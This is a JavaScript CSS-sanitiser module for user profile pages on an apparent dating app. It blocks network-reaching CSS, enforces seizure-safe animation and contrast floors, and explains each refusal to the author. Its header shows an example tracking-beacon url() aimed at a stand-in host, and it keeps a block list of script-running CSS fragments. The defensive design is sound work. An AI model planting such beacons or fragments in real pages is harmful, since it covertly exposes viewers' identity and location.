/**
 * CSS parsing, allow-listing, and the accessibility floors.
 *
 * THE HOLE THIS CLOSES, stated plainly because it is not obvious:
 * a stylesheet that can fetch a URL is a tracking beacon. `background:
 * url(https://me.example/hit?who=…)` tells the page's author who opened their
 * profile and from what IP, with no click and nothing visible. In a dating app,
 * for the population most likely to be stalked, that is a physical-safety bug
 * wearing a CSS hat. `@import`, `@font-face` and `image-set()` are the same hole
 * through different doors, and `url()` inside a custom property is the same hole
 * again one level of indirection down — which is why custom property values are
 * scanned with exactly the same rules as any other value.
 *
 * The renderer's CSP is the containment (`default-src 'none'`, no network
 * origins at all). This module is the *contract*: it tells the author what is
 * allowed, in their own words, before the CSP silently drops it.
 *
 * Two rules are enforced on the author's behalf rather than against them, and
 * both come from the viewer's body rather than the author's taste:
 *   - animation cycles are clamped to >= 0.5s, so an author cannot build a
 *     strobe. Photosensitive-seizure guidance draws its line at three flashes a
 *     second; half a second a cycle caps it at two.
 *   - text that fails WCAG AA (4.5:1) against a background declared in the same
 *     rule is darkened or lightened until it passes, and the change is reported.
 */

const RESERVED = /(^|[^\w-])s3-|\[\s*data-3s/i;

/**
 * Properties an author may set. Allow-list, never block-list: a block-list is a
 * promise that we thought of everything, and nobody can keep it.
 */
export const ALLOWED_PROPS = new Set([
  // box
  'display', 'position', 'top', 'right', 'bottom', 'left', 'z-index', 'float', 'clear',
  'width', 'height', 'min-width', 'min-height', 'max-width', 'max-height',
  'margin', 'margin-top', 'margin-right', 'margin-bottom', 'margin-left', 'margin-inline', 'margin-block',
  'padding', 'padding-top', 'padding-right', 'padding-bottom', 'padding-left', 'padding-inline', 'padding-block',
  'box-sizing', 'overflow', 'overflow-x', 'overflow-y', 'aspect-ratio', 'inset',
  // flex + grid
  'flex', 'flex-basis', 'flex-direction', 'flex-flow', 'flex-grow', 'flex-shrink', 'flex-wrap',
  'align-content', 'align-items', 'align-self', 'justify-content', 'justify-items', 'justify-self',
  'gap', 'row-gap', 'column-gap', 'order', 'place-items', 'place-content',
  'grid', 'grid-area', 'grid-auto-columns', 'grid-auto-flow', 'grid-auto-rows',
  'grid-column', 'grid-column-end', 'grid-column-start', 'grid-row', 'grid-row-end', 'grid-row-start',
  'grid-template', 'grid-template-areas', 'grid-template-columns', 'grid-template-rows',
  'columns', 'column-count', 'column-width', 'column-gap', 'column-rule',
  // typography
  'color', 'font', 'font-family', 'font-size', 'font-style', 'font-variant', 'font-weight',
  'font-stretch', 'font-feature-settings', 'font-variant-caps', 'font-variant-numeric',
  'letter-spacing', 'line-height', 'text-align', 'text-decoration', 'text-decoration-color',
  'text-decoration-line', 'text-decoration-style', 'text-decoration-thickness',
  'text-indent', 'text-overflow', 'text-shadow', 'text-transform', 'text-wrap',
  'white-space', 'word-break', 'word-spacing', 'overflow-wrap', 'hyphens', 'vertical-align',
  'writing-mode', 'direction', 'unicode-bidi', 'quotes', 'tab-size',
  // decoration
  'background', 'background-attachment', 'background-blend-mode', 'background-clip',
  'background-color', 'background-image', 'background-origin', 'background-position',
  'background-repeat', 'background-size',
  'border', 'border-top', 'border-right', 'border-bottom', 'border-left',
  'border-color', 'border-style', 'border-width', 'border-radius',
  'border-top-color', 'border-top-style', 'border-top-width',
  'border-right-color', 'border-right-style', 'border-right-width',
  'border-bottom-color', 'border-bottom-style', 'border-bottom-width',
  'border-left-color', 'border-left-style', 'border-left-width',
  'border-top-left-radius', 'border-top-right-radius',
  'border-bottom-left-radius', 'border-bottom-right-radius',
  'border-image', 'border-image-slice', 'border-image-source', 'border-image-width',
  'box-shadow', 'opacity', 'outline', 'outline-color', 'outline-offset', 'outline-style', 'outline-width',
  'filter', 'backdrop-filter', 'mix-blend-mode', 'isolation', 'clip-path', 'mask-image',
  // motion + transform
  'transform', 'transform-origin', 'transform-style', 'perspective', 'perspective-origin',
  'rotate', 'scale', 'translate', 'backface-visibility',
  'transition', 'transition-delay', 'transition-duration', 'transition-property', 'transition-timing-function',
  'animation', 'animation-delay', 'animation-direction', 'animation-duration',
  'animation-fill-mode', 'animation-iteration-count', 'animation-name',
  'animation-play-state', 'animation-timing-function',
  // lists + tables
  'list-style', 'list-style-position', 'list-style-type',
  'border-collapse', 'border-spacing', 'caption-side', 'empty-cells', 'table-layout',
  // misc that cannot reach the network
  'content', 'cursor', 'visibility', 'object-fit', 'object-position',
  'pointer-events', 'resize', 'user-select', 'scroll-behavior', 'accent-color',
  'caret-color', 'image-rendering', 'appearance', 'counter-increment', 'counter-reset',
]);

/** At-rules an author may use, and why the rest are not here. */
const ALLOWED_AT = new Set(['media', 'supports', 'keyframes', '-webkit-keyframes']);

const AT_REFUSALS = {
  import: ['@import fetches a stylesheet over the network, which would tell the page’s author who opened it and from where.', 'paste the rules into this stylesheet directly'],
  'font-face': ['@font-face downloads a font file, which is a network request and therefore a visit tracker.', 'pick one of the built-in font stacks in the Fonts knob'],
  charset: ['@charset has no effect here — the page is always UTF-8.', 'nothing; delete it'],
  namespace: ['@namespace is for XML documents, and profile pages are not one.', 'nothing; delete it'],
  page: ['@page styles printed output, which this renderer does not produce.', 'style the page itself'],
  property: ['@property registers a typed custom property, which changes how the browser parses values everywhere on the page.', 'a plain custom property, e.g. --my-colour: #123'],
};

/** Value fragments that reach the network or the script engine. */
const BAD_FN = [
  ['image-set(', 'image-set() picks between remote image URLs, which is a network request.', 'embed the image with the photo block; it is stored inside the page'],
  ['-webkit-image-set(', 'image-set() picks between remote image URLs, which is a network request.', 'embed the image with the photo block'],
  ['element(', 'element() renders another element as an image and is not supported here.', 'a background gradient, or an embedded photo'],
  ['expression(', 'expression() ran JavaScript in old browsers. Profile pages never run scripts.', 'a static value'],
  ['-moz-binding', '-moz-binding loaded executable XBL. Profile pages never run scripts.', 'a static value'],
  ['javascript:', 'javascript: URLs are code. Profile pages never run scripts.', 'a plain https: link'],
  ['attr(', 'attr() is reserved for the parts of the page 3rdSpace adds itself, such as a link’s real destination.', 'type the text you want'],
];

// ---------------------------------------------------------------- parsing

/** Split a declaration list into `{prop, value, important}`. Quote- and paren-aware. */
export function parseDecls(src) {
  const out = [];
  let i = 0, depth = 0, quote = null, buf = '';
  const flush = () => {
    const s = buf.trim();
    buf = '';
    if (!s) return;
    const c = s.indexOf(':');
    if (c < 0) return;
    const prop = s.slice(0, c).trim();
    let value = s.slice(c + 1).trim();
    let important = false;
    const m = /!\s*important\s*$/i.exec(value);
    if (m) { important = true; value = value.slice(0, m.index).trim(); }
    if (prop) out.push({ prop, value, important });
  };
  for (; i < src.length; i++) {
    const ch = src[i];
    if (quote) { buf += ch; if (ch === quote && src[i - 1] !== '\\') quote = null; continue; }
    if (ch === '"' || ch === "'") { quote = ch; buf += ch; continue; }
    if (ch === '(') depth++;
    if (ch === ')') depth = Math.max(0, depth - 1);
    if (ch === ';' && depth === 0) { flush(); continue; }
    buf += ch;
  }
  flush();
  return out;
}

/**
 * Parse a stylesheet into rules and at-rules. Comments are stripped first; a
 * comment cannot hide a rule from us because it is gone before we look.
 */
export function parseStylesheet(src) {
  const s = stripComments(src);
  const nodes = [];
  let i = 0;
  while (i < s.length) {
    while (i < s.length && /\s/.test(s[i])) i++;
    if (i >= s.length) break;

    if (s[i] === '@') {
      const nameM = /^@([a-zA-Z-]+)/.exec(s.slice(i));
      const name = nameM ? nameM[1].toLowerCase() : '';
      let j = i + (nameM ? nameM[0].length : 1);
      let depth = 0, preludeEnd = -1, bodyStart = -1, bodyEnd = -1;
      for (; j < s.length; j++) {
        if (s[j] === '{') {
          if (depth === 0) { preludeEnd = j; bodyStart = j + 1; }
          depth++;
        } else if (s[j] === '}') {
          depth--;
          if (depth === 0) { bodyEnd = j; j++; break; }
        } else if (s[j] === ';' && depth === 0) {
          preludeEnd = j; j++; break;
        }
      }
      const prelude = s.slice(i + (nameM ? nameM[0].length : 1), preludeEnd < 0 ? s.length : preludeEnd).trim();
      nodes.push({
        type: 'at', name, prelude,
        body: bodyStart >= 0 ? s.slice(bodyStart, bodyEnd < 0 ? s.length : bodyEnd) : null,
      });
      i = j;
      continue;
    }

    const open = findTop(s, i, '{');
    if (open < 0) break;
    const close = matchBrace(s, open);
    nodes.push({
      type: 'rule',
      selector: s.slice(i, open).trim(),
      decls: s.slice(open + 1, close),
    });
    i = close + 1;
  }
  return nodes;
}

function stripComments(s) {
  let out = '', i = 0, quote = null;
  while (i < s.length) {
    const ch = s[i];
    if (quote) { out += ch; if (ch === quote && s[i - 1] !== '\\') quote = null; i++; continue; }
    if (ch === '"' || ch === "'") { quote = ch; out += ch; i++; continue; }
    if (ch === '/' && s[i + 1] === '*') {
      const end = s.indexOf('*/', i + 2);
      i = end < 0 ? s.length : end + 2;
      out += ' ';
      continue;
    }
    out += ch;
    i++;
  }
  return out;
}

function findTop(s, from, ch) {
  let quote = null;
  for (let i = from; i < s.length; i++) {
    const c = s[i];
    if (quote) { if (c === quote && s[i - 1] !== '\\') quote = null; continue; }
    if (c === '"' || c === "'") { quote = c; continue; }
    if (c === ch) return i;
    if (c === '}') return -1;
  }
  return -1;
}

function matchBrace(s, open) {
  let depth = 0, quote = null;
  for (let i = open; i < s.length; i++) {
    const c = s[i];
    if (quote) { if (c === quote && s[i - 1] !== '\\') quote = null; continue; }
    if (c === '"' || c === "'") { quote = c; continue; }
    if (c === '{') depth++;
    else if (c === '}') { depth--; if (depth === 0) return i; }
  }
  return s.length;
}

// ------------------------------------------------------------- url policy

/**
 * The only two URL forms a profile page may reference.
 *
 * `data:` because the page is a self-contained document, and `asset:` because
 * that is our own indirection into the page's embedded image store, resolved to
 * a `data:` URL at render. Neither can leave the device.
 */
export function urlsAreLocal(value) {
  // `url\s*\(` rather than `url\(`: whitespace before the paren makes it an
  // invalid function token that no browser fetches, but relying on that is
  // relying on a parser detail to be a security boundary. Match it and refuse.
  const re = /url\s*\(\s*(['"]?)([^'")]*)\1\s*\)/gi;
  let m;
  while ((m = re.exec(value))) {
    const u = m[2].trim().toLowerCase();
    if (!u.startsWith('data:') && !u.startsWith('asset:')) return false;
  }
  return true;
}

// --------------------------------------------------------------- colours

const NAMED_COLOURS = {
  black: '#000000', white: '#ffffff', red: '#ff0000', green: '#008000', blue: '#0000ff',
  yellow: '#ffff00', cyan: '#00ffff', aqua: '#00ffff', magenta: '#ff00ff', fuchsia: '#ff00ff',
  gray: '#808080', grey: '#808080', silver: '#c0c0c0', maroon: '#800000', olive: '#808000',
  lime: '#00ff00', teal: '#008080', navy: '#000080', purple: '#800080', orange: '#ffa500',
  pink: '#ffc0cb', gold: '#ffd700', beige: '#f5f5dc', ivory: '#fffff0', khaki: '#f0e68c',
  lavender: '#e6e6fa', salmon: '#fa8072', tan: '#d2b48c', violet: '#ee82ee', indigo: '#4b0082',
  turquoise: '#40e0d0', crimson: '#dc143c', coral: '#ff7f50', tomato: '#ff6347',
  skyblue: '#87ceeb', steelblue: '#4682b4', seagreen: '#2e8b57', darkblue: '#00008b',
  darkgreen: '#006400', darkred: '#8b0000', lightblue: '#add8e6', lightgreen: '#90ee90',
  lightgray: '#d3d3d3', lightgrey: '#d3d3d3', dimgray: '#696969', dimgrey: '#696969',
  whitesmoke: '#f5f5f5', gainsboro: '#dcdcdc', snow: '#fffafa', mintcream: '#f5fffa',
  midnightblue: '#191970', rebeccapurple: '#663399',
};

/** Parse a colour to `[r,g,b]` 0-255, or null when we cannot tell. */
export function parseColour(v) {
  if (!v) return null;
  const s = String(v).trim().toLowerCase();
  if (NAMED_COLOURS[s]) return parseColour(NAMED_COLOURS[s]);
  let m = /^#([0-9a-f]{3,8})$/.exec(s);
  if (m) {
    const h = m[1];
    if (h.length === 3 || h.length === 4) {
      return [parseInt(h[0] + h[0], 16), parseInt(h[1] + h[1], 16), parseInt(h[2] + h[2], 16)];
    }
    if (h.length === 6 || h.length === 8) {
      return [parseInt(h.slice(0, 2), 16), parseInt(h.slice(2, 4), 16), parseInt(h.slice(4, 6), 16)];
    }
    return null;
  }
  m = /^rgba?\(([^)]+)\)$/.exec(s);
  if (m) {
    const parts = m[1].split(/[,\s/]+/).filter(Boolean).slice(0, 3).map((x) => (
      x.endsWith('%') ? (parseFloat(x) / 100) * 255 : parseFloat(x)
    ));
    if (parts.length < 3 || parts.some((x) => !Number.isFinite(x))) return null;
    return parts.map((x) => Math.max(0, Math.min(255, Math.round(x))));
  }
  m = /^hsla?\(([^)]+)\)$/.exec(s);
  if (m) {
    const parts = m[1].split(/[,\s/]+/).filter(Boolean);
    const h = parseFloat(parts[0]);
    const sat = parseFloat(parts[1]) / 100;
    const li = parseFloat(parts[2]) / 100;
    if (![h, sat, li].every(Number.isFinite)) return null;
    return hslToRgb(((h % 360) + 360) % 360, Math.max(0, Math.min(1, sat)), Math.max(0, Math.min(1, li)));
  }
  return null;
}

function hslToRgb(h, s, l) {
  const c = (1 - Math.abs(2 * l - 1)) * s;
  const x = c * (1 - Math.abs(((h / 60) % 2) - 1));
  const m = l - c / 2;
  const t = h < 60 ? [c, x, 0] : h < 120 ? [x, c, 0] : h < 180 ? [0, c, x]
    : h < 240 ? [0, x, c] : h < 300 ? [x, 0, c] : [c, 0, x];
  return t.map((v) => Math.round((v + m) * 255));
}

export function toHex(rgb) {
  return `#${rgb.map((x) => Math.max(0, Math.min(255, Math.round(x))).toString(16).padStart(2, '0')).join('')}`;
}

function channel(c) {
  const x = c / 255;
  return x <= 0.03928 ? x / 12.92 : ((x + 0.055) / 1.055) ** 2.4;
}

export function luminance(rgb) {
  return 0.2126 * channel(rgb[0]) + 0.7152 * channel(rgb[1]) + 0.0722 * channel(rgb[2]);
}

/** WCAG 2.1 contrast ratio, 1..21. */
export function contrast(a, b) {
  const la = luminance(a), lb = luminance(b);
  return (Math.max(la, lb) + 0.05) / (Math.min(la, lb) + 0.05);
}

export const MIN_CONTRAST = 4.5;

/**
 * Move a foreground colour toward black or white until it clears AA against the
 * background. Direction is chosen by which end has further to give, so a mid
 * grey on a mid grey does not get stuck.
 */
export function fixContrast(fg, bg, min = MIN_CONTRAST) {
  if (contrast(fg, bg) >= min) return fg;
  const toWhite = contrast([255, 255, 255], bg);
  const toBlack = contrast([0, 0, 0], bg);
  const target = toWhite >= toBlack ? [255, 255, 255] : [0, 0, 0];
  let lo = 0, hi = 1, best = target;
  for (let k = 0; k < 24; k++) {
    const t = (lo + hi) / 2;
    const mix = fg.map((c, i) => c + (target[i] - c) * t);
    if (contrast(mix, bg) >= min) { best = mix; hi = t; } else { lo = t; }
  }
  return best.map(Math.round);
}

// ------------------------------------------------------- motion clamping

export const MIN_ANIM_SECONDS = 0.5;

/** Raise any animation cycle shorter than half a second. Returns [value, changed]. */
export function clampAnimation(value) {
  let changed = false;
  const out = value.replace(/(-?\d*\.?\d+)(ms|s)\b/gi, (whole, num, unit) => {
    const secs = unit.toLowerCase() === 'ms' ? parseFloat(num) / 1000 : parseFloat(num);
    if (!Number.isFinite(secs) || secs >= MIN_ANIM_SECONDS) return whole;
    changed = true;
    return `${MIN_ANIM_SECONDS}s`;
  });
  return [out, changed];
}

const MIN_FONT_PX = 11;

function clampFontSize(value) {
  const m = /^(-?\d*\.?\d+)px$/i.exec(value.trim());
  if (!m) return [value, false];
  const px = parseFloat(m[1]);
  if (!Number.isFinite(px) || px >= MIN_FONT_PX) return [value, false];
  return [`${MIN_FONT_PX}px`, true];
}

// ------------------------------------------------------------ the filter

/**
 * @param {string} src author stylesheet
 * @param {{ scope?: string }} opts `scope` prefixes every selector, so a page's
 *        CSS cannot reach outside the element the page is rendered into. In the
 *        sandboxed iframe this is belt and braces; it matters for the editor's
 *        live preview, which shares a document with the editor chrome.
 * @returns {{ css: string, removals: Array<{what:string, why:string, instead:string}> }}
 */
export function sanitizeCss(src, opts = {}) {
  const removals = [];
  const note = (what, why, instead) => {
    if (removals.length < 200) removals.push({ what, why, instead });
  };
  const css = emit(parseStylesheet(String(src ?? '')), opts.scope ?? null, note, 0);
  return { css, removals };
}

function emit(nodes, scope, note, depth) {
  const out = [];
  for (const n of nodes) {
    if (n.type === 'at') {
      if (!ALLOWED_AT.has(n.name)) {
        const r = AT_REFUSALS[n.name];
        note(`@${n.name}`, r ? r[0] : `@${n.name} is not one of the at-rules profile pages allow.`,
          r ? r[1] : '@media, @supports or @keyframes');
        continue;
      }
      if (n.body === null) { note(`@${n.name}`, 'that at-rule has no block, so there is nothing to apply.', 'give it a { } block'); continue; }
      if (n.name === 'media' && !mediaPreludeOk(n.prelude)) {
        note(`@media ${n.prelude}`,
          'that media query uses a feature profile pages do not allow, because some of them report facts about the reader’s device.',
          '@media (max-width: 600px), (orientation: portrait) or (prefers-color-scheme: dark)');
        continue;
      }
      const inner = n.name === 'keyframes' || n.name === '-webkit-keyframes'
        ? emitKeyframes(n.body, note)
        : emit(parseStylesheet(n.body), scope, note, depth + 1);
      if (inner.trim()) out.push(`@${n.name} ${n.prelude} {\n${inner}}\n`);
      continue;
    }

    const sel = sanitizeSelector(n.selector, scope, note);
    if (!sel) continue;
    const decls = emitDecls(n.decls, note);
    if (decls.trim()) out.push(`${sel} {\n${decls}}\n`);
  }
  return out.join('');
}

function emitKeyframes(body, note) {
  const out = [];
  for (const n of parseStylesheet(body)) {
    if (n.type !== 'rule') continue;
    const sel = n.selector.trim();
    if (!/^(from|to|-?\d*\.?\d+%)(\s*,\s*(from|to|-?\d*\.?\d+%))*$/i.test(sel)) {
      note(`keyframe "${sel}"`, 'keyframe steps are percentages, or the words from and to.', '0%, 50%, 100%');
      continue;
    }
    const decls = emitDecls(n.decls, note);
    if (decls.trim()) out.push(`  ${sel} {\n${decls}  }\n`);
  }
  return out.join('');
}

function mediaPreludeOk(prelude) {
  const p = prelude.toLowerCase();
  if (/[{}\\;@]/.test(p)) return false;
  const features = p.match(/\(([^)]*)\)/g) ?? [];
  for (const f of features) {
    const name = f.slice(1).split(':')[0].trim();
    if (!/^(min-|max-)?(width|height|aspect-ratio|orientation|prefers-color-scheme|prefers-reduced-motion|prefers-contrast|hover|pointer|any-hover|any-pointer|display-mode)$/.test(name)) {
      return false;
    }
  }
  return /^[\w\s(),:.%/-]*$/.test(p);
}

function sanitizeSelector(sel, scope, note) {
  const s = sel.trim();
  if (!s) return null;
  if (RESERVED.test(s)) {
    note(`selector "${s}"`,
      '3rdSpace reserves the s3- prefix and the data-3s attribute for the parts of the page it adds itself — a link’s real destination, for one. Author CSS cannot restyle or hide those.',
      'give your own elements a class of your own');
    return null;
  }
  // MEASURED, on the demo's own hand-written page: the earlier version of this
  // class included `>`, so every child combinator was refused — and
  // `#pp-page > *` is the first selector the built-in stylesheet teaches, so an
  // author copying a rule out of it had their copy silently rejected. `<` stays:
  // it cannot appear in a selector, and its presence means markup has leaked
  // into the stylesheet.
  if (/[{}<@;\\]|\/\*/.test(s)) {
    note(`selector "${s}"`, 'that selector contains a character that cannot appear in one.',
      'a plain selector such as .card h2, or #pp-page > *');
    return null;
  }
  if (!/^[\w\s.#*\[\]()>+~:,="'^$|!%/-]*$/.test(s)) {
    note(`selector "${s}"`, 'that selector contains characters profile pages do not allow.', 'letters, digits, . # [ ] : > + ~ and ,');
    return null;
  }
  if (!scope) return s;
  return s.split(',').map((part) => {
    const t = part.trim();
    if (!t) return '';
    // Already scoped: the built-in stylesheet is written in terms of #pp-page,
    // and an author copying a rule out of it must get the rule they copied.
    // Prefixing again would produce `#pp-page #pp-page > *`, which matches
    // nothing — a silent no-op is the worst possible answer to a correct edit.
    if (t === scope || t.startsWith(`${scope} `) || t.startsWith(`${scope}>`)
      || t.startsWith(`${scope}.`) || t.startsWith(`${scope}:`) || t.startsWith(`${scope}[`)) return t;
    if (/^(:root|html|body)\b/i.test(t)) return `${scope}${t.replace(/^(:root|html|body)/i, '')}`.trim() || scope;
    return `${scope} ${t}`;
  }).filter(Boolean).join(', ');
}

function emitDecls(src, note) {
  const kept = [];
  const decls = parseDecls(src);
  for (const d of decls) {
    const prop = d.prop.toLowerCase();
    const custom = prop.startsWith('--');

    if (!custom && !ALLOWED_PROPS.has(prop)) {
      note(`${d.prop}`,
        `${d.prop} is not on the list of properties profile pages allow. The list is an allow-list on purpose: a block-list is a promise that we thought of everything.`,
        'colour, spacing, borders, shadows, fonts, layout and animation are all available');
      continue;
    }

    let value = d.value;
    const low = value.toLowerCase();

    // A backslash outside a quoted string is a CSS escape, and a CSS escape is how
    // `url(` gets spelled as a function token no substring check will find. Values
    // that legitimately need one are quoted (`content: "\\201C"`), so the rule is:
    // escapes are fine inside quotes and refused outside them.
    if (hasBareBackslash(value)) {
      note(`${d.prop}: ${short(value)}`,
        'That value contains a CSS escape outside a quoted string. An escape can spell a function name one character at a time, so a page cannot use one to reach the network under another spelling.',
        'write the value out in plain characters');
      continue;
    }

    let bad = null;
    for (const [frag, why, instead] of BAD_FN) if (low.includes(frag)) { bad = [frag, why, instead]; break; }
    if (bad) { note(`${d.prop}: ${short(value)}`, bad[1], bad[2]); continue; }

    if (/url\s*\(/i.test(low) && !urlsAreLocal(value)) {
      note(`${d.prop}: ${short(value)}`,
        'that url() points somewhere off this device. A stylesheet that can fetch a URL is a visit tracker: it would tell the page’s author who opened their profile, and from what IP address, with no click and nothing visible.',
        'add the image as a photo block — it is stored inside the page, so nobody can swap it out either');
      continue;
    }

    if (prop === 'animation' || prop === 'animation-duration') {
      const [v2, changed] = clampAnimation(value);
      if (changed) {
        note(`${d.prop}: ${short(value)}`,
          'animation cycles shorter than half a second can flash fast enough to trigger a seizure, so they are slowed down rather than dropped. Your animation still runs.',
          'a cycle of 0.5s or longer');
        value = v2;
      }
    }
    if (prop === 'font-size') {
      const [v2, changed] = clampFontSize(value);
      if (changed) {
        note(`${d.prop}: ${short(value)}`, 'text below 11px is unreadable on a phone, so it is raised to 11px.', '11px or larger, or a relative size like 0.9em');
        value = v2;
      }
    }

    kept.push({ prop: d.prop, value, important: d.important });
  }

  // Contrast floor, applied per rule: if a rule sets both a text colour and a
  // background colour, the text must clear AA against it. We only touch pairs we
  // can actually parse, and we say so when we change one.
  const fg = kept.find((k) => k.prop.toLowerCase() === 'color');
  const bgDecl = [...kept].reverse().find((k) => ['background-color', 'background'].includes(k.prop.toLowerCase()));
  if (fg && bgDecl) {
    const f = parseColour(fg.value);
    const b = parseColour(bgDecl.value) ?? parseColour((bgDecl.value.match(/#[0-9a-f]{3,8}|rgba?\([^)]*\)|hsla?\([^)]*\)|[a-z]+/i) ?? [])[0]);
    if (f && b && contrast(f, b) < MIN_CONTRAST) {
      const fixed = toHex(fixContrast(f, b));
      note(`color: ${fg.value}`,
        `that text only reached ${contrast(f, b).toFixed(1)}:1 against the background set in the same rule, and 4.5:1 is the readable floor. It has been shifted to ${fixed}.`,
        'pick a darker or lighter text colour yourself if you want a specific one');
      fg.value = fixed;
    }
  }

  return kept.map((k) => `  ${k.prop}: ${k.value}${k.important ? ' !important' : ''};\n`).join('');
}

/** A backslash outside quotes: a CSS escape sequence, refused above. */
function hasBareBackslash(value) {
  let quote = null;
  for (let i = 0; i < value.length; i++) {
    const ch = value[i];
    if (quote) { if (ch === quote && value[i - 1] !== '\\') quote = null; continue; }
    if (ch === '"' || ch === "'") { quote = ch; continue; }
    if (ch === '\\') return true;
  }
  return false;
}

function short(v) {
  const s = String(v).replace(/\s+/g, ' ').trim();
  return s.length > 60 ? `${s.slice(0, 57)}…` : s;
}

/**
 * The same declaration filter, applied to a `style=""` attribute.
 *
 * Inline styles get the identical treatment to a stylesheet rule, including the
 * url() policy and the contrast floor — an author must not be able to reach the
 * network by moving one declaration out of the stylesheet and into an attribute.
 */
export function sanitizeInlineStyle(src) {
  const removals = [];
  const css = emitDecls(String(src ?? ''), (what, why, instead) => removals.push({ what, why, instead }));
  return { css: css.replace(/\s*\n\s*/g, ' ').trim(), removals };
}
